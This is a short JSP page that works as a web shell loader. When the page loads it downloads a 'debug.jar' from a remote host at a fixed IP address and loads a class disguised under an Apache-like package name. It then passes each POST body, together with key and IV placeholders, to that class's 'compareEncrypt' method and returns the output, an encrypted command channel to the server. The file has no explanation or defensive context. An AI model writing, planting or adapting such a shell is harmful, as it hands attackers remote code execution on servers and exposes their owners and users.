<%@ page import="java.net.URL" %>
<%@ page import="java.net.URLClassLoader" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    private class Holder{
        public Class getInstance() {
            Class clazz = null;
            try{
                clazz = Class.forName("org.apache.clinton.DebugRequest", true, new URLClassLoader(new URL[]{new URL("http://10.21.140.73:8888/debug.jar")}));
            }catch(Exception e){
                e.printStackTrace();
            }
            return clazz;
        }
    }
%>
<%!
    Class clazz = new Holder().getInstance();
%>
<%
    BufferedReader br = request.getReader();
    String str, postBody = "";
    while((str = br.readLine()) != null) {
        postBody += str + "\n";
    }
	br.close();

    String key = "[key_placeholder]";
    String iv = "[iv_placeholder]";
	
    if(postBody != null && !postBody.trim().equals("")){
        postBody = postBody.substring(0, postBody.length()-1);
        Method method = clazz.getMethod("compareEncrypt", String.class, String.class, String.class);
        response.getWriter().print(method.invoke(clazz.newInstance(), key, iv, postBody));
    }
%>